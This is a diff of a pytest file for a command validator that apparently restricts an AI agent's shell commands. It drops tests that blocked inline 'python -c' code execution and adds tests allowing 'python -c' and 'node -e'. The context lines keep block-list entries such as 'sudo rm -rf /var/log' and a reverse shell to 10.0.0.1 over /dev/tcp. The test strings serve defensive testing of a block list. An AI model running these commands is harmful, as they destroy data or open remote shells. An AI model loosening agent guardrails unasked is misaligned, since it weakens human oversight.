@@ -150,9 +150,6 @@ class TestBlockedPatterns:
             # sudo
             "sudo apt install something",
             "sudo rm -rf /var/log",
-            # Inline code execution
-            "python -c 'import os; os.system(\"rm -rf /\")'",
-            'python3 -c \'__import__("os").system("id")\'',
             # Reverse shell indicators
             "bash -i >& /dev/tcp/10.0.0.1/4444",
             # Credential theft
@@ -227,22 +224,13 @@ class TestEdgeCases:
         validate_command("rm temp.txt")
         validate_command("rm -f output.log")
 
-    def test_python_without_c_flag_is_safe(self):
-        """python script.py is safe; only python -c is blocked."""
+    def test_python_commands_are_safe(self):
+        """python commands (including -c) are allowed for agent scripting."""
         validate_command("python script.py")
         validate_command("python -m pytest tests/")
-
-    @pytest.mark.parametrize(
-        "cmd",
-        [
-            "python -c'print(1)'",
-            'python3 -c"print(1)"',
-        ],
-    )
-    def test_python_c_with_quoted_inline_code_is_blocked(self, cmd):
-        """Quoted inline code after -c should still be blocked."""
-        with pytest.raises(CommandBlockedError):
-            validate_command(cmd)
+        validate_command("python3 -c 'print(1)'")
+        validate_command("python -c 'import json; print(json.dumps({}))'")
+        validate_command("node -e 'console.log(1)'")
 
     def test_error_message_is_descriptive(self):
         """Blocked commands should include a useful error message."""
